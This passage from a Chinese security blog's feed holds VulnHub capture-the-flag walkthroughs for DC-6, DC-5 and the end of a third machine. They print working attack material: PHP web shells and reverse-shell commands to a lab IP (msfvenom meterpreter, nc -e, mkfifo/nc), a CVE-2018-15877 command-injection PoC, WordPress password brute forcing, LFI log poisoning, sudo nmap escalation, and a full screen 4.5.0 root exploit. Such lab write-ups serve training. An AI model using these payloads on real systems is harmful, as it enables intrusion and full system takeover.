生成一个 <code>PHP</code> 的木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=7777 -f raw</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1287.png" alt="图片"></p><p>紧接着打开 <code>MSF</code> 设置参数开启监听：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1288.png" alt="图片"></p><p>最后添加我们的脚本代码到页面中：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1289.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1290.png" alt="图片"></p><p>（PS：如果失败了那么先设置为 <code>PHP code</code>，再把脚本代码放进去保存就可以了）</p><p>设置好之后成功反弹得到一枚 <code>shell</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1291.png" alt="图片"></p><p>得到<code>shell</code>之后用<code>MSF</code>自带的模块查看有没有可以提权的模块，但是发现没有可利用提权的地方：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1292.png" alt="图片"></p><p>先让它切换到 <code>shell</code> 环境把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1293.png" alt="图片"></p><h2 id="利用backups-sh文件提权"><a href="#利用backups-sh文件提权" class="headerlink" title="利用backups.sh文件提权"></a>利用backups.sh文件提权</h2><p>随后我们来到了 <code>/opt/scripts</code> 目录下，因为之前我们知道了 <code>backups.sh</code> 它只能 <code>root</code> 用户和 <code>www-data</code> 用户权限去修改它：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1294.png" alt="图片"></p><p>所以我们就可以利用这段代码来反弹一个 <code>shell</code> 到 <code>KALI</code>，反弹回来的<code>shell</code>自然就是<code>root</code>权限！</p><p>先是我们在 KALI <code>nc</code> 监听 <code>8888</code> ，然后输入这段代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.128 8888 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1295.png" alt="图片"></p><p>这个时候就成功获取到 <code>root</code> 权限，拿到 <code>FLAG</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1296.png" alt="图片"></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-DC_6-Walkthrough</title>
      <link href="/2020/03/06/Vulnhub-DC-6/"/>
      <url>/2020/03/06/Vulnhub-DC-6/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=31108722&auto=1&height=66"></iframe><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt </span><br></pre></td></tr></table></figure><p>That should save you a few years. ;-)</p><h2 id="运用的知识"><a href="#运用的知识" class="headerlink" title="运用的知识"></a>运用的知识</h2><p><code>wpsacn</code>爆破网站用户密码<br><code>wordpress</code>后台<code>Activity monitor</code>插件<code>命令注入</code>获取shell<br><code>nmap</code>提权获取root</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到 <code>IP</code> 后对它进行扫描端口开放服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.145</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1247.png" alt="图片"></p><p>扫描出来后发现它开放了 <code>80</code>（http）、<code>22</code>（ssh），紧接着访问 <code>http://192.168.1.145</code>  发现它重定向到了这个 URL ：<code>wordy</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1248.png" alt="图片"></p><p>然后我设置了一下 <code>hosts</code> 文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1249.png" alt="图片"></p><p>设置好之后打开 <code>http://wordy</code>  发现它的 CMS 是 <code>Wordpress</code> ：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1250.png" alt="图片"></p><h2 id="wpscan爆破网站用户密码"><a href="#wpscan爆破网站用户密码" class="headerlink" title="wpscan爆破网站用户密码"></a>wpscan爆破网站用户密码</h2><p>既然是 <code>wordpress</code> 那么我就先用 <code>wpscan</code> 来对它进行扫描把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -e u</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1251.png" alt="图片"></p><p>扫描出来后发现它有这些用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">jens</span><br><span class="line">graham</span><br><span class="line">mark</span><br><span class="line">sarah</span><br></pre></td></tr></table></figure><p>紧接着我又生成了一些字典文件来对它网站进行爆破：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01</span><br><span class="line"># 这是作者给我们的提示！</span><br></pre></td></tr></table></figure><p>生成完字典后对它网站用户名挨个爆破枚举，看看能不能捡漏：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U user -P passwords.txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1252.png" alt="图片"></p><p>爆破成功后得到 <code>mark</code> 的密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username: mark, Password: helpdesk01</span><br></pre></td></tr></table></figure><p>随后我用得到的账号和密码登陆到了网站的后台发现了一个插件：<code>Activity monitor</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1253.png" alt="图片"></p><h2 id="Activity-monitor-插件命令注入获取shell"><a href="#Activity-monitor-插件命令注入获取shell" class="headerlink" title="Activity monitor 插件命令注入获取shell"></a>Activity monitor 插件命令注入获取shell</h2><p>看到这个插件我去搜索了一下发现有一个<code>命令注入</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1254.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PoC:</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;google.fr| nc 192.168.1.128 9999 -e /bin/bash&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;lookup&quot; value=&quot;Lookup&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1255.png" alt="图片"></p><p>设置好之后 KALI 用 <code>nc</code> 监听 <code>6666</code> 端口，访问 <code>poc.html</code> 得到一枚 <code>shell</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1256.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1257.png" alt="图片"></p><p>先让他得到一个 <code>bash</code> 外壳把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1258.png" alt="图片"></p><p>通过信息搜集我发现 <code>mark</code> 目录下有一个文件，里面泄露了 <code>graham</code> 的密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Things to do:</span><br><span class="line"></span><br><span class="line">- Restore full functionality for the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present for Sarah&#x27;s farewell party</span><br><span class="line">- Add new user: graham - GSo7isUM1D4 - done</span><br><span class="line">- Apply for the OSCP course</span><br><span class="line">- Buy new laptop for Sarah&#x27;s replacement</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1259.png" alt="图片"></p><p>拿到密码后我 <code>ssh</code> 登陆到了 <code>graham</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1260.png" alt="图片"></p><h2 id="sudo切换到jens用户"><a href="#sudo切换到jens用户" class="headerlink" title="sudo切换到jens用户"></a>sudo切换到jens用户</h2><p>登陆成功后我习惯性的 <code>sudo -l</code> 发现 <code>graham</code> 用户可以以 <code>jens</code> 的身份去运行 <code>/home/jens/backups.sh</code> 文件：</p><p>查看 <code>backups.sh</code> 文件后发现它是一个解压的命令，接着我以 <code>jens</code> 身份去运行这个文件成功切换到了 <code>jens</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1261.png" alt="图片"></p><h2 id="nmap提权"><a href="#nmap提权" class="headerlink" title="nmap提权"></a>nmap提权</h2><p>成功来到 <code>jens</code> 用户后我又是习惯性的 <code>sudo -l</code> 发现它可以以 <code>root</code> 身份去运行 <code>/usr/bin/nmap</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1262.png" alt="图片"></p><p>最后也是用 <code>nmap</code> 提权为 <code>root</code> 用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1263.png" alt="图片"></p><p>最终也是在 <code>/root</code> 目录下拿到了 <code>Flag</code>～</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-DC_5-Walkthrough</title>
      <link href="/2020/03/03/Vulnhub-DC-5/"/>
      <url>/2020/03/03/Vulnhub-DC-5/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=527416715&auto=1&height=66"></iframe><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p><p>The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).</p><p>靶机地址：<a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a></p><h2 id="学习到的知识"><a href="#学习到的知识" class="headerlink" title="学习到的知识"></a>学习到的知识</h2><p><code>LFI</code>(本地文件包含)日志获取shell<br><code>wfuzz</code>工具的使用<br><code>screen</code>提权root</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到 <code>IP</code> 先扫描端口开放服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T 4 192.168.1.144</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1222.png" alt="图片"></p><p>它这边只开放了 <code>80</code>（http）和 <code>111</code>（RPC）两个端口服务！</p><p>RPC 他是一个<code>RPC</code>服务，主要是在<code>nfs</code>共享时候负责通知客户端，服务器的<code>nfs</code>端口号的。简单理解<code>rpc</code>就是一个中介服务。</p><p>我们先来到 <code>WEB</code> 端，但是没有什么可利用点，只有一个表单提交的地方：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.144/contact.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1223.png" alt="图片"></p><p>我随便提交了一些内容，发现了它会被提交到 <code>thankyou.php</code> 这个文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1224.png" alt="图片"></p><h2 id="LFI本地文件包含获取shell"><a href="#LFI本地文件包含获取shell" class="headerlink" title="LFI本地文件包含获取shell"></a>LFI本地文件包含获取shell</h2><p>看上去有点像 <code>LFI</code>（本地文件包含）漏洞，紧接着我用 KALI 自带的 wfuz 工具对它一顿FUZZ梭哈：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/test.txt -w /usr/share/wfuzz/wordlist/LFI/LFI-InterestingFiles.txt http://192.168.1.144/thankyou.php?FUZZ=FUZ2Z</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1225.png" alt="图片"></p><p>由于<code>FUZZ</code>出来的参数太多了！而且好多都没有，我两眼一迷的仔细找到了一个参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.144/thankyou.php?file=/etc/mysql/my.cnf</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1226.png" alt="图片"></p><p>打开后我发现它可以读取系统文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1227.png" alt="图片"></p><p>这个时候确定了它存在本地文件包含！那么我继续用 <code>wfuzz</code> 缩小我们得到的参数范围：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/test.txt -w /usr/share/wfuzz/wordlist/LFI/LFI-InterestingFiles.txt --hh 851,835 http://192.168.1.144/thankyou.php?FUZZ=FUZ2Z</span><br><span class="line">--h 是过滤Chars</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1228.png" alt="图片"></p><p>这样我们就成功的得到一些可利用的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">arget: http://192.168.1.144/thankyou.php?FUZZ=FUZ2Z</span><br><span class="line">Total requests: 2568</span><br><span class="line"></span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload                                                                                                                                    </span><br><span class="line">===================================================================</span><br><span class="line"></span><br><span class="line">000001714:   200        44 L     68 W     861 Ch      &quot;file - /etc/issue&quot;                                                                                                                        </span><br><span class="line">000001715:   200        49 L     103 W    1121 Ch     &quot;file - /etc/motd&quot;                                                                                                                         </span><br><span class="line">000001716:   200        70 L     104 W    2319 Ch     &quot;file - /etc/passwd&quot;                                                                                                                       </span><br><span class="line">000001717:   200        70 L     104 W    2319 Ch     &quot;file - /etc/passwd&quot;                                                                                                                       </span><br><span class="line">000001719:   200        96 L     117 W    1558 Ch     &quot;file - /etc/group&quot;                                                                                                                        </span><br><span class="line">000001833:   500        38 L     58 W     786 Ch      &quot;file - /etc/php5/apache2/php.ini&quot;                                                                                                         </span><br><span class="line">000001844:   500        38 L     58 W     786 Ch      &quot;file - /etc/php5/cgi/php.ini&quot;                                                                                                             </span><br><span class="line">000001872:   200        170 L    590 W    4368 Ch     &quot;file - /etc/mysql/my.cnf&quot;                                                                                                                 </span><br><span class="line">000001926:   200        65662    871324   9389548 C   &quot;file - /var/log/nginx/access.log&quot;        </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1229.png" alt="图片"></p><p>随后我发现了它的一个日志文件里有我们的请求记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.144/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1230.png" alt="图片"></p><p>既然日志能记录我们的操作，那么我们就写入一句话到日志文件里吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.144/thankyou.php?file=&lt;?php system($_GET[&#x27;saul&#x27;]) ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1231.png" alt="图片"></p><p>(温馨提示：到这里我靶机重启了一下，所以 IP 变了)</p><p>接下来然后用日志文件去执行命令 <code>ls</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.144/thankyou.php?file=/var/log/nginx/error.log&amp;saul=ls</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1232.png" alt="图片"></p><p>成功执行命令！那么我就用 <code>nc</code> 反弹一个<code>shell</code>回来吧！先是 KALI <code>nc</code> 监听 <code>5555</code> 端口，然后访问得到一枚 <code>shell</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.144/thankyou.php?file=/var/log/nginx/error.log&amp;saul=nc -e /bin/bash 192.168.1.128 5555</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1233.png" alt="图片"></p><p>得到 shell 以后我用 <code>python</code> 切换到 <code>bash</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1234.png" alt="图片"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>之后我查找 <code>SUID</code> 权限的文件发现了 <code>screen</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1235.png" alt="图片"></p><p>紧接着我又去搜索了一下关于 <code>screen</code> 的漏洞，找到了一个提权 <code>poc</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1236.png" alt="图片"></p><p>接着我按照上面的 <code>POC</code> 创建了 <code>libhax.c</code>、<code>rootshell.c</code> 文件，文件内容是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat libhax.c </span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># cat rootshell.c </span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1237.png" alt="图片"></p><p>随后用 <code>gcc</code> 编译他们：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 